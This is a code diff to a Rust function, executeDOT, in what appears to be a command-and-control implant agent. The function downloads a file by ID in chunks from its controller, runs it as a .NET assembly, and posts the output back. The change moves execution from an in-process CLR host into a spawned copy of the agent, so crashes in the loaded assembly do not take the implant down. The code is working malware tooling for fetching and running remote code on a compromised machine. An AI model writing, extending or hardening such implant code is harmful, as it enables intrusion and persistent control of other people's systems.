@@ -1,14 +1,9 @@
-use clroxide::clr::Clr;
-use std::{env, fs, process::exit};
-
 use serde::Deserialize;
 use serde_json::{Value, json};
 use base64::engine::general_purpose;
 use base64::Engine;
-use std::io::{Cursor, Read};
+use std::io::Write;
 const CHUNK_SIZE: usize = 4096;
-use std::path::PathBuf;
-
 
 #[derive(Deserialize)]
 struct UploadParams {
@@ -22,7 +17,7 @@ pub fn executeDOT(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
     let raw = task.get("parameters").and_then(Value::as_str).ok_or("Missing `parameters`")?;
     let params: UploadParams = serde_json::from_str(raw)?;
     let file_id = &params.file_id;
-    
+
     // 2. Download chunks into buffer
     let mut file_bytes = Vec::new();
     let mut chunk_num = 1;
@@ -50,37 +45,43 @@ pub fn executeDOT(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
         chunk_num += 1;
     }
 
+    // 3. Spawn self as isolated worker process so a crash/exit in the
+    //    .NET assembly doesn't take down the agent.
+    let exe = std::env::current_exe()?;
+    let worker_input = json!({
+        "file_bytes": general_purpose::STANDARD.encode(&file_bytes),
+        "parameters": params.parameters
+    })
+    .to_string();
 
+    let mut child = std::process::Command::new(&exe)
+        .arg("--worker-dot")
+        .stdin(std::process::Stdio::piped())
+        .stdout(std::process::Stdio::piped())
+        .stderr(std::process::Stdio::piped())
+        .spawn()?;
 
-    let args: Vec<String> = params.parameters
-    .split_whitespace()
-    .map(|s| s.to_string())
-    .collect();
+    if let Some(mut stdin) = child.stdin.take() {
+        stdin.write_all(worker_input.as_bytes())?;
+    }
 
-    // Run CLR inside catch_unwind so a panic from the loaded assembly
-    // doesn't unwind through the agent and kill the whole process.
-    let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| -> Result<String, Box<dyn std::error::Error>> {
-        let mut clr = Clr::new(file_bytes, args)?;
-        let output = clr.run()?;
-        Ok(output)
-    }));
+    let child_output = child.wait_with_output()?;
 
-    let (results, status) = match result {
-        Ok(Ok(output)) => (output, "success"),
-        Ok(Err(e)) => (format!("DOT execution error: {:?}", e), "error"),
-        Err(panic_info) => {
-            let msg = if let Some(s) = panic_info.downcast_ref::<&str>() {
-                format!("DOT execution panicked: {}", s)
-            } else if let Some(s) = panic_info.downcast_ref::<String>() {
-                format!("DOT execution panicked: {}", s)
-            } else {
-                "DOT execution panicked (unknown cause)".to_string()
-            };
-            (msg, "error")
-        }
+    let (results, status) = if child_output.status.success() {
+        (String::from_utf8_lossy(&child_output.stdout).to_string(), "success")
+    } else {
+        let stderr = String::from_utf8_lossy(&child_output.stderr);
+        let stdout = String::from_utf8_lossy(&child_output.stdout);
+        let msg = format!(
+            "DOT worker exited with code {:?}{}{}",
+            child_output.status.code(),
+            if !stdout.is_empty() { format!("\nstdout: {}", stdout) } else { String::new() },
+            if !stderr.is_empty() { format!("\nstderr: {}", stderr) } else { String::new() }
+        );
+        (msg, "error")
     };
 
-    // 4. Send final response — always reached, even on error/panic
+    // 4. Send final response — always reached even if worker crashed
     let done = json!({
         "action": "post_response",
         "responses": [{
@@ -94,4 +95,3 @@ pub fn executeDOT(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
     crate::transport::send_request(&done)?;
     Ok(())
 }
-
